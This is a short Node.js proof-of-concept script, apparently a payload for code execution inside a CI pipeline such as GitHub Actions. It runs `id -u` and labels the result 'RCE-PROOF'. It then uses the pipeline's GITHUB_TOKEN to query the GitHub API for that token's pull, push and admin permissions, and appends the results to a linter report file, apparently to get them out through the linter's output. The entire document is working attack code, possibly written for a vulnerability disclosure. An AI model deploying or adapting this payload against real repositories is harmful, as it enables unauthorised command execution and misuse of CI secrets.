const fs = require('fs');
const { execSync } = require('child_process');
let out = [];
try { out.push('RCE-PROOF uid=' + execSync('id -u').toString().trim()); } catch (e) { out.push('uid-error'); }
(async () => {
  try {
    const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, {
      headers: { authorization: 'Bearer ' + process.env.GITHUB_TOKEN, 'user-agent': 'poc' }
    });
    const j = await r.json();
    out.push('TOKEN-PERMS pull=' + (j.permissions && j.permissions.pull) + ' push=' + (j.permissions && j.permissions.push) + ' admin=' + (j.permissions && j.permissions.admin));
  } catch (e) { out.push('api-error ' + e.message); }
  try {
    fs.appendFileSync('linter-report.txt', '\n' + out.join('\n') + '\n');
  } catch (e) { console.log('append failed ' + e.message); }
})();
